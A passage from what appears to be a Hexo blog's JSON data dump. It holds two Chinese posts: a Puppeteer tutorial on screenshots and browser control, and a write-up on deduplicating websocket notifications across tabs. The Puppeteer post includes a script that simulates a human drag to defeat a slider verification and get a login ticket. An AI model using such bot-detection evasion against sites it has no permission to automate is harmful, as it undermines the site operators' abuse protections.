class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> puppeteer = <span class=\"built_in\">require</span>(<span class=\"string\">'puppeteer'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"keyword\">async</span> () =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 启动浏览器</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> browser = <span class=\"keyword\">await</span> puppeteer.launch();</span><br><span class=\"line\">  <span class=\"comment\">// 打开一个标签页，这里称为page</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> page = <span class=\"keyword\">await</span> browser.newPage();</span><br><span class=\"line\">  <span class=\"comment\">// 去到你想截图的页面</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.goto(<span class=\"string\">'https://example.com'</span>);</span><br><span class=\"line\">  <span class=\"comment\">// 将鼠标移动到这里</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.mouse.move(<span class=\"number\">1020</span>, <span class=\"number\">250</span>);</span><br><span class=\"line\">  <span class=\"comment\">// 按下鼠标</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.mouse.down()</span><br><span class=\"line\">  <span class=\"comment\">// 将鼠标移动（模拟用户拖动的动作）</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.mouse.move( <span class=\"number\">1266</span>, <span class=\"number\">250</span>, &#123; <span class=\"attr\">step</span>: <span class=\"number\">240</span> &#125; )</span><br><span class=\"line\">  <span class=\"comment\">// 释放鼠标</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.mouse.up()</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<p>此时我们就能完成滑动验证以生成用于登陆的票据，再取出来返回出去，调用者就可以使用这个票据来模拟用户登录了。<br>\n这里的<code>step</code>非常重要，尽量以两次移动的x坐标的差值来设定它，因为这个滑动组件就是这样来判断是否是用户行为的（当然有了puppeteer我们连真人都可以伪装了），如果不设置step，虽然一样可以将滑块滑过去，但是是无法验证成功。<br>\n还有个很重要的api忘了介绍，就是page下面的<code>evaluate</code>方法，参数是Function或者String，函数或者字符串会被传递到chrome里面执行，再将结果返回出去，这样我们就可以取得页面上或者js里面的值了。</p>\n<p>到最后其实我发现了它的一个bug，最后输出的图片会在垂直方向的第16000像素多一点的地方开始断掉并从网页最头部开始重复，这让人有点懊恼，尝试了一些办法都没有解决，无奈提了<a href=\"https://github.com/GoogleChrome/puppeteer/issues/1752\" target=\"_blank\" rel=\"noopener\">issure</a>，希望官方能够解决，</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在GitHub上面google官方是这样介绍<code>Puppeteer</code>的</p>\n<blockquote>\n<p>Puppeteer is a Node library which provides a high-level API to control headless Chrome or Chromium over the DevTools Protocol. It can also be configured to use full (non-headless) Chrome or Chromium.</p>\n</blockquote>\n<p>它是一个nodejs的API库，我们可以用它来操作一个浏览器，<code>headless</code>模式就是在内存里运行，不用启动界面，因为我们将它交给代码来控制。下面来说说我实际使用puppeteer的例子</p>\n<h4>网页截图</h4>\n<p>这个功能可以说是一个特色功能了，虽然已经有<code>phantomjs</code>这种，但是实际的出图效果和肉眼看到的效果相差甚远，当然只是在一些css3样式下面会有这种情况，可能是编译的版本比较旧吧。前几日在逛掘金的时候看到有人发帖介绍这个puppeteer，重点介绍了截图的功能。突然想到公司项目里“截长图”这个万年难题，总是有这样那样的样式问题。于是我抽出了点时间照着Demo做了一份出来试试我们出问题的样式在它下面的截图效果。效果真的是非常非常好。下面是从安装到截图的步骤</p>\n<p>首先在项目里安装puppeteer</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install puppeteer --ignore-scripts</span><br></pre></td></tr></table></figure>\n<p>这里的<code>--ignore-scripts</code>是为了忽略包里的安装命令，因为这个命令要下载chrome，但是通常都无法下载，需要手动下载。<br>\n使用这个命令安装好后我们就需要手动去下载chrome了，找到<code>node_modules/puppeteer/utils/ChromiumDownloader.js</code>第95行（可能会因为代码更新有所变动）找到</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">url = util.format(url, downloadHost, revision)</span><br></pre></td></tr></table></figure>\n<p>在下面输出url（<code>console.log(url)</code>），再去到puppeteer目录里，运行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">node install.js</span><br></pre></td></tr></table></figure>\n<p>得到输出的地址，然后再用下载工具下载。之后上传到一个支持https的云端上面，如七牛，反正能够通过https直接访问到资源就行了，再将这个链接重新赋值给url这个变量保存后再运行一次<code>node install.js</code>这样chrome就装好了然后我们就可以写代码了，下面是最简单的例子</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> puppeteer = <span class=\"built_in\">require</span>(<span class=\"string\">'puppeteer'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"keyword\">async</span> () =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 启动浏览器</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> browser = <span class=\"keyword\">await</span> puppeteer.launch();</span><br><span class=\"line\">  <span class=\"comment\">// 打开一个标签页，这里称为page</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> page = <span class=\"keyword\">await</span> browser.newPage();</span><br><span class=\"line\">  <span class=\"comment\">// 去到你想截图的页面</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.goto(<span class=\"string\">'https://example.com'</span>);</span><br><span class=\"line\">  <span class=\"comment\">// 调用截图api</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.screenshot(&#123;<span class=\"attr\">path</span>: <span class=\"string\">'example.png'</span>&#125;);</span><br><span class=\"line\">  <span class=\"comment\">// 关闭浏览器</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> browser.close();</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<p>几乎所有的api都返回一个<code>Promise</code>，为了不陷入无穷无尽的回调，我们在这里选择<code>async/await</code>语法，所以需要较新的nodejs版本。当然，实际使用中是不会这么简单的，比如我们截图截的是长图，并且需要将文件直接返回出去，所以我们可以不用保存文件到本地，查看文档后知道<code>screenshot</code>方法返回的是一个Promise<buffer>，我们可以直接将buffer相应给请求。配合<code>express</code>可以这样（当然为了易于维护和扩展，代码肯定不会这么写）</buffer></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> app = <span class=\"built_in\">require</span>( <span class=\"string\">'express'</span> )()</span><br><span class=\"line\"></span><br><span class=\"line\">app.get( <span class=\"string\">'/get-screenshot'</span>, <span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> req, res </span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"comment\">// 启动浏览器</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> browser = <span class=\"keyword\">await</span> puppeteer.launch();</span><br><span class=\"line\">  <span class=\"comment\">// 打开一个标签页，这里称为page</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> page = <span class=\"keyword\">await</span> browser.newPage();</span><br><span class=\"line\">  <span class=\"comment\">// 去到你想截图的页面</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.goto(<span class=\"string\">'https://example.com'</span>);</span><br><span class=\"line\">  <span class=\"comment\">// 调用截图api</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> image = <span class=\"keyword\">await</span> page.screenshot();</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 为了能够让浏览器自动下载，我们需要再设置响应头</span></span><br><span class=\"line\">  res.setHeader(<span class=\"string\">'content-type'</span>, <span class=\"string\">'image/png'</span>)</span><br><span class=\"line\">  res.setHeader(<span class=\"string\">'content-disposition'</span>, <span class=\"string\">'attachment; filename=\"image.png\"'</span>)</span><br><span class=\"line\">  </span><br><span class=\"line\">  res.send( image )</span><br><span class=\"line\">&#125; )</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app.listen(<span class=\"number\">8080</span>)</span><br></pre></td></tr></table></figure>\n<p>其实这里可以优化一下，我们都知道启动一个程序是很耗时的，我们可以在nodejs服务启动的时候就把浏览器启动起来，当截图请求发起的时候再去打开一个标签页，再截图，完成后再关闭标签页就能节约很多时间。<br>\n还有很多细节的问题这里就不再赘述了，比如截图的质量，截图的文件类型png/jpg，等待图片全部加载完成再发起截图，关于截图这一块官方提供了好几个参数来控制，感兴趣的可以看官方的文档<a href=\"https://github.com/GoogleChrome/puppeteer/blob/master/docs/api.md\" target=\"_blank\" rel=\"noopener\">puppeteer</a></p>\n<h4>浏览器操控</h4>\n<p>这算是它的核心功能了，如果要模拟一个用户的行为去访问一个网页，肯定少不了交互，鼠标、键盘和触摸等等，这些puppeteer全都可以做到，举个简单的例子，有些数据必须要鼠标点击、拖动、滚轮滚动才会产生，这个时候用一些后端语言是无法模拟的，这个时候就需要调用api去操控浏览器来完成操作。<br>\n实际需求：使用后端程序登陆一个网站后去访问一些接口，但是登陆的时候有一个验证，需要用户使用鼠标拉动一个滑块到最后再释放鼠标生成登陆票据才能验证通过，像这样<br>\n<img src=\"QQ20180109-225305.png\" alt=\"\"><br>\n这种使用纯代码是很难验证通过的，但是使用一个浏览器环境的话就简单多了，于是我们想到使用nodejs作为服务来专门获取用于登陆的参数，下面是用来模拟用户滑动滑块的代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> puppeteer = <span class=\"built_in\">require</span>(<span class=\"string\">'puppeteer'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"keyword\">async</span> () =&gt; &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 启动浏览器</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> browser = <span class=\"keyword\">await</span> puppeteer.launch();</span><br><span class=\"line\">  <span class=\"comment\">// 打开一个标签页，这里称为page</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> page = <span class=\"keyword\">await</span> browser.newPage();</span><br><span class=\"line\">  <span class=\"comment\">// 去到你想截图的页面</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.goto(<span class=\"string\">'https://example.com'</span>);</span><br><span class=\"line\">  <span class=\"comment\">// 将鼠标移动到这里</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.mouse.move(<span class=\"number\">1020</span>, <span class=\"number\">250</span>);</span><br><span class=\"line\">  <span class=\"comment\">// 按下鼠标</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.mouse.down()</span><br><span class=\"line\">  <span class=\"comment\">// 将鼠标移动（模拟用户拖动的动作）</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.mouse.move( <span class=\"number\">1266</span>, <span class=\"number\">250</span>, &#123; <span class=\"attr\">step</span>: <span class=\"number\">240</span> &#125; )</span><br><span class=\"line\">  <span class=\"comment\">// 释放鼠标</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> page.mouse.up()</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<p>此时我们就能完成滑动验证以生成用于登陆的票据，再取出来返回出去，调用者就可以使用这个票据来模拟用户登录了。<br>\n这里的<code>step</code>非常重要，尽量以两次移动的x坐标的差值来设定它，因为这个滑动组件就是这样来判断是否是用户行为的（当然有了puppeteer我们连真人都可以伪装了），如果不设置step，虽然一样可以将滑块滑过去，但是是无法验证成功。<br>\n还有个很重要的api忘了介绍，就是page下面的<code>evaluate</code>方法，参数是Function或者String，函数或者字符串会被传递到chrome里面执行，再将结果返回出去，这样我们就可以取得页面上或者js里面的值了。</p>\n<p>到最后其实我发现了它的一个bug，最后输出的图片会在垂直方向的第16000像素多一点的地方开始断掉并从网页最头部开始重复，这让人有点懊恼，尝试了一些办法都没有解决，无奈提了<a href=\"https://github.com/GoogleChrome/puppeteer/issues/1752\" target=\"_blank\" rel=\"noopener\">issure</a>，希望官方能够解决，</p>\n"},{"title":"解决Websocket并发执行的问题","catalog":true,"date":"2017-09-12T13:08:00.000Z","subtitle":"setTimeout也算能线救国","header-img":"post/IMG_2847.JPG","_content":"在解决掉这个问题之前，我都有点想放弃了，因为尝试的方法都不行，照惯例先来描述下问题吧。\n\n> 为了能在所有页面能接收到服务器给用户发起的通知，所以我们在每个页面建立了`websocket`长连接来监听服务器的动静，那么问题来了，如果我开启了两个，三个甚至四个标签页，那效果你能猜到：刷刷刷一排通知烦到你直接关了通知功能。\n\n标签页之间的通信，我了解到的目前就两种\n* 通过`window.opener.window.postMessage`来对`opener`发起消息\n* 通过`localStorage`或`webSQL`等媒介来通信\n\n当然还有很多奇奇怪怪的办法，主流的办法还是采用后者，前者因为限制太多直接pass，`webSQL`有兼容性问题还是pass，所以最后选择了`localStorage`。\n\n其实我最先的解决办法还是很简单直接的，看起来也是对的：\n```js\n// 比如我的消息回调函数是这样的\nwebsocket.onmessage = function( msg ) {\n\n  if ( localStorage.getItem( 'isNotice' ) === '1' ) return;\n\n  localStorage.setItem( 'isNotice', '1' );\n  // 进行通知\n  doNotice( msg );\n\n  // 一秒后重置为未通知，因为同时通知的时间比较接近，所以需要等待1秒左右再重置\n  setTimeout( () => localStorage.setItem( 'isNotice', '0' ), 1e3 );\n}\n```\n是不是看起来很完美，对呀我也觉得很完美，可是我们忽略了一个问题，浏览器在往磁盘写文件的时候是需要时间的，而这个Output动作相对于JavaScript的执行来说非常的耗时，两个通知的时间非常非常的接近，经过我的测试最近的达到`5ms`，还是在只测试了几次的情况。所以这短短的5ms根本来不及将数据写入到磁盘（或许原理不是这样，但在两个标签页的情况下测试结果确实是一个先通知进行磁盘写入，后通知的`localStorage.getItem( 'isNotice' )`还是等于`0`）.\n\n于是我就想到通过`localStorage`来同步每次通知开启的情况代码太乱就不贴出来了，直接说说思路\n> 标签页通常情况是一个一个打开的，那么我们就直接从websocket链接本身来解决问题，当打开一个页面时我们开启通知，然后在`localStorage`标记好通知已经开启，同时监听一个叫`unonload`的事件(就是页面在跳转或关闭时会触发的事件)，事件响应时我们标记通知websocket已经关闭，然后我们新开页面的时候就去再去监听`Storage`事件（如果通知开启过了），这个事件一旦响应，我们就再去启动`websocket`链接。连起来的逻辑就是<br/><br/>整个系统只允许开启一个`websocket`链接，开启了`websocket`的页面在关闭时去标记通知已经关闭，其他页面知道后就会再去开启一个`websocket`链接，可问题就是，只能在两个页面开启的情况下有效，因为如果有两个页面监听了`Storage`事件，那么还是会开启两次链接，即使解决了这个问题，当浏览器崩溃等非正常关闭页面时，`onunload`事件不会触发，就是说如果页面崩溃一次，那就再也见不到通知了。这很悲惨，于是我又回到了“**在开启多个websocket连接的情况，如何只通知一次消息**”这个问题\n\n经过一番深思，我想到了“你们这么积极要通知，那好，等你们闹腾完了我再把消息拿去通知吧”，思路是这样的：\n\n> 通知来临时我们直接将通知内容写到`Storage`，然后`setTimeout`延时来取得这个内容进行通知，然后再移除这个通知内容，但是setTimeout的时间非常关键，如果是个固定值，那也白忙活了，必须保证每个页面的延时都不一样且相差较大\n\n```js\nwebsocket.onmessage = function( msg ) {\n  localStorage.setItem( 'notice', msg );\n\n  setTimeout( function() {\n    let noticeContent = localStorage.getItem( 'notice' )\n    noticeContent && doNotice( noticeContent );\n    localStorage.removeItem( 'notice' );\n  }, Math.random() * 3000 )\n}\n```\n其实只能说问题解决了一半，因为算法能力比较捉急，只能随便写个3000内的随机数，如果运气不好随机到很接近的数，还是可能会重复通知，并且页面越多，几率越大。如果你看到这里有什么好的办法，欢迎邮件或留言通知我与我互相交流。\n\n也许要从根本解决这个问题，就只能开启一个通知吧。\n","source":"_posts/page-parallel-execute.md","raw":"---\ntitle: 解决Websocket并发执行的问题\ncatalog: true\ndate: 2017-09-12 21:08:00\nsubtitle: setTimeout也算能线救国\nheader-img: post/IMG_2847.JPG\ntags:\n- websocket\n- 并发\n---\n在解决掉这个问题之前，我都有点想放弃了，因为尝试的方法都不行，照惯例先来描述下问题吧。\n\n> 为了能在所有页面能接收到服务器给用户发起的通知，所以我们在每个页面建立了`websocket`长连接来监听服务器的动静，那么问题来了，如果我开启了两个，三个甚至四个标签页，那效果你能猜到：刷刷刷一排通知烦到你直接关了通知功能。\n\n标签页之间的通信，我了解到的目前就两种\n* 通过`window.opener.window.postMessage`来对`opener`发起消息\n* 通过`localStorage`或`webSQL`等媒介来通信\n\n当然还有很多奇奇怪怪的办法，主流的办法还是采用后者，前者因为限制太多直接pass，`webSQL`有兼容性问题还是pass，所以最后选择了`localStorage`。\n\n其实我最先的解决办法还是很简单直接的，看起来也是对的：\n```js\n// 比如我的消息回调函数是这样的\nwebsocket.onmessage = function( msg ) {\n\n  if ( localStorage.getItem( 'isNotice' ) === '1' ) return;\n\n  localStorage.setItem( 'isNotice', '1' );\n  // 进行通知\n  doNotice( msg );\n\n  // 一秒后重置为未通知，因为同时通知的时间比较接近，所以需要等待1秒左右再重置\n  setTimeout( () => localStorage.setItem( 'isNotice', '0' ), 1e3 );\n}\n```\n是不是看起来很完美，对呀我也觉得很完美，可是我们忽略了一个问题，浏览器在往磁盘写文件的时候是需要时间的，而这个Output动作相对于JavaScript的执行来说非常的耗时，两个通知的时间非常非常的接近，经过我的测试最近的达到`5ms`，还是在只测试了几次的情况。所以这短短的5ms根本来不及将数据写入到磁盘（或许原理不是这样，但在两个标签页的情况下测试结果确实是一个先通知进行磁盘写入，后通知的`localStorage.getItem( 'isNotice' )`还是等于`0`）.\n\n于是我就想到通过`localStorage`来同步每次通知开启的情况代码太乱就不贴出来了，直接说说思路\n> 标签页通常情况是一个一个打开的，那么我们就直接从websocket链接本身来解决问题，当打开一个页面时我们开启通知，然后在`localStorage`标记好通知已经开启，同时监听一个叫`unonload`的事件(就是页面在跳转或关闭时会触发的事件)，事件响应时我们标记通知websocket已经关闭，然后我们新开页面的时候就去再去监听`Storage`事件（如果通知开启过了），这个事件一旦响应，我们就再去启动`websocket`链接。连起来的逻辑就是<br/><br/>整个系统只允许开启一个`websocket`链接，开启了`websocket`的页面在关闭时去标记通知已经关闭，其他页面知道后就会再去开启一个`websocket`链接，可问题就是，只能在两个页面开启的情况下有效，因为如果有两个页面监听了`Storage`事件，那么还是会开启两次链接，即使解决了这个问题，当浏览器崩溃等非正常关闭页面时，`onunload`事件不会触发，就是说如果页面崩溃一次，那就再也见不到通知了。这很悲惨，于是我又回到了“**在开启多个websocket连接的情况，如何只通知一次消息**”这个问题\n\n经过一番深思，我想到了“你们这么积极要通知，那好，等你们闹腾完了我再把消息拿去通知吧”，思路是这样的：\n\n> 通知来临时我们直接将通知内容写到`Storage`，然后`setTimeout`延时来取得这个内容进行通知，然后再移除这个通知内容，但是setTimeout的时间非常关键，如果是个固定值，那也白忙活了，必须保证每个页面的延时都不一样且相差较大\n\n```js\nwebsocket.onmessage = function( msg ) {\n  localStorage.setItem( 'notice', msg );\n\n  setTimeout( function() {\n    let noticeContent = localStorage.getItem( 'notice' )\n    noticeContent && doNotice( noticeContent );\n    localStorage.removeItem( 'notice' );\n  }, Math.random() * 3000 )\n}\n```\n其实只能说问题解决了一半，因为算法能力比较捉急，只能随便写个3000内的随机数，如果运气不好随机到很接近的数，还是可能会重复通知，并且页面越多，几率越大。如果你看到这里有什么好的办法，欢迎邮件或留言通知我与我互相交流。\n\n也许要从根本解决这个问题，就只能开启一个通知吧。\n","slug":"page-parallel-execute","published":1,"updated":"2017-09-13T01:18:08.311Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cje9esjw1000ti4uc5bjpk38z","content":"<p>在解决掉这个问题之前，我都有点想放弃了，因为尝试的方法都不行，照惯例先来描述下问题吧。</p>\n<blockquote>\n<p>为了能在所有页面能接收到服务器给用户发起的通知，所以我们在每个页面建立了<code>websocket</code>长连接来监听服务器的动静，那么问题来了，如果我开启了两个，三个甚至四个标签页，那效果你能猜到：刷刷刷一排通知烦到你直接关了通知功能。</p>\n</blockquote>\n<p>标签页之间的通信，我了解到的目前就两种</p>\n<ul>\n<li>通过<code>window.opener.window.postMessage</code>来对<code>opener</code>发起消息</li>\n<li>通过<code>localStorage</code>或<code>webSQL</code>等媒介来通信</li>\n</ul>\n<p>当然还有很多奇奇怪怪的办法，主流的办法还是采用后者，前者因为限制太多直接pass，<code>webSQL</code>有兼容性问题还是pass，所以最后选择了<code>localStorage</code>。</p>\n<p>其实我最先的解决办法还是很简单直接的，看起来也是对的：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 比如我的消息回调函数是这样的</span></span><br><span class=\"line\">websocket.onmessage = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> msg </span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( localStorage.getItem( <span class=\"string\">'isNotice'</span> ) === <span class=\"string\">'1'</span> ) <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  localStorage.setItem( <span class=\"string\">'isNotice'</span>, <span class=\"string\">'1'</span> );</span><br><span class=\"line\">  <span class=\"comment\">// 进行通知</span></span><br><span class=\"line\">  doNotice( msg );</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 一秒后重置为未通知，因为同时通知的时间比较接近，所以需要等待1秒左右再重置</span></span><br><span class=\"line\">  setTimeout( <span class=\"function\"><span class=\"params\">()</span> =&gt;</span> localStorage.setItem( <span class=\"string\">'isNotice'</span>, <span class=\"string\">'0'</span> ), <span class=\"number\">1e3</span> );</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>是不是看起来很完美，对呀我也觉得很完美，可是我们忽略了一个问题，浏览器在往磁盘写文件的时候是需要时间的，而这个Output动作相对于JavaScript的执行来说非常的耗时，两个通知的时间非常非常的接近，经过我的测试最近的达到<code>5ms</code>，还是在只测试了几次的情况。所以这短短的5ms根本来不及将数据写入到磁盘（或许原理不是这样，但在两个标签页的情况下测试结果确实是一个先通知进行磁盘写入，后通知的<code>localStorage.getItem( 'isNotice' )</code>还是等于<code>0</code>）.</p>\n<p>于是我就想到通过<code>localStorage</code>来同步每次通知开启的情况代码太乱就不贴出来了，直接说说思路</p>\n<blockquote>\n<p>标签页通常情况是一个一个打开的，那么我们就直接从websocket链接本身来解决问题，当打开一个页面时我们开启通知，然后在<code>localStorage</code>标记好通知已经开启，同时监听一个叫<code>unonload</code>的事件(就是页面在跳转或关闭时会触发的事件)，事件响应时我们标记通知websocket已经关闭，然后我们新开页面的时候就去再去监听<code>Storage</code>事件（如果通知开启过了），这个事件一旦响应，我们就再去启动<code>websocket</code>链接。连起来的逻辑就是<br><br>整个系统只允许开启一个<code>websocket</code>链接，开启了<code>websocket</code>的页面在关闭时去标记通知已经关闭，其他页面知道后就会再去开启一个<code>websocket</code>链接，可问题就是，只能在两个页面开启的情况下有效，因为如果有两个页面监听了<code>Storage</code>事件，那么还是会开启两次链接，即使解决了这个问题，当浏览器崩溃等非正常关闭页面时，<code>onunload</code>事件不会触发，就是说如果页面崩溃一次，那就再也见不到通知了。这很悲惨，于是我又回到了“<strong>在开启多个websocket连接的情况，如何只通知一次消息</strong>”这个问题</p>\n</blockquote>\n<p>经过一番深思，我想到了“你们这么积极要通知，那好，等你们闹腾完了我再把消息拿去通知吧”，思路是这样的：</p>\n<blockquote>\n<p>通知来临时我们直接将通知内容写到<code>Storage</code>，然后<code>setTimeout</code>延时来取得这个内容进行通知，然后再移除这个通知内容，但是setTimeout的时间非常关键，如果是个固定值，那也白忙活了，必须保证每个页面的延时都不一样且相差较大</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">websocket.onmessage = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> msg </span>) </span>&#123;</span><br><span class=\"line\">  localStorage.setItem( <span class=\"string\">'notice'</span>, msg );</span><br><span class=\"line\"></span><br><span class=\"line\">  setTimeout( <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> noticeContent = localStorage.getItem( <span class=\"string\">'notice'</span> )</span><br><span class=\"line\">    noticeContent &amp;&amp; doNotice( noticeContent );</span><br><span class=\"line\">    localStorage.removeItem( <span class=\"string\">'notice'</span> );</span><br><span class=\"line\">  &#125;, <span class=\"built_in\">Math</span>.random() * <span class=\"number\">3000</span> )</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>其实只能说问题解决了一半，因为算法能力比较捉急，只能随便写个3000内的随机数，如果运气不好随机到很接近的数，还是可能会重复通知，并且页面越多，几率越大。如果你看到这里有什么好的办法，欢迎邮件或留言通知我与我互相交流。</p>\n<p>也许要从根本解决这个问题，就只能开启一个通知吧。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在解决掉这个问题之前，我都有点想放弃了，因为尝试的方法都不行，照惯例先来描述下问题吧。</p>\n<blockquote>\n<p>为了能在所有页面能接收到服务器给用户发起的通知，所以我们在每个页面建立了<code>websocket</code>长连接来监听服务器的动静，那么问题来了，如果我开启了两个，三个甚至四个标签页，那效果你能猜到：刷刷刷一排通知烦到你直接关了通知功能。</p>\n</blockquote>\n<p>标签页之间的通信，我了解到的目前就两种</p>\n<ul>\n<li>通过<code>window.opener.window.postMessage</code>来对<code>opener</code>发起消息</li>\n<li>通过<code>localStorage</code>或<code>webSQL</code>等媒介来通信</li>\n</ul>\n<p>当然还有很多奇奇怪怪的办法，主流的办法还是采用后者，前者因为限制太多直接pass，<code>webSQL</code>有兼容性问题还是pass，所以最后选择了<code>localStorage</code>。</p>\n<p>其实我最先的解决办法还是很简单直接的，看起来也是对的：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 比如我的消息回调函数是这样的</span></span><br><span class=\"line\">websocket.onmessage = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"> msg </span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( localStorage.getItem( <span class=\"string\">'isNotice'</span> ) === <span class=\"string\">'1'</span> ) <span class=\"keyword\">return</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  localStorage.setItem( <span class=\"string\">'isNotice'</span>, <span class=\"string\">'1'</span> );</span><br><span class=\"line\">  <span class=\"comment\">// 进行通知</span></span><br><span class=\"line\">  doNotice( msg );</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// 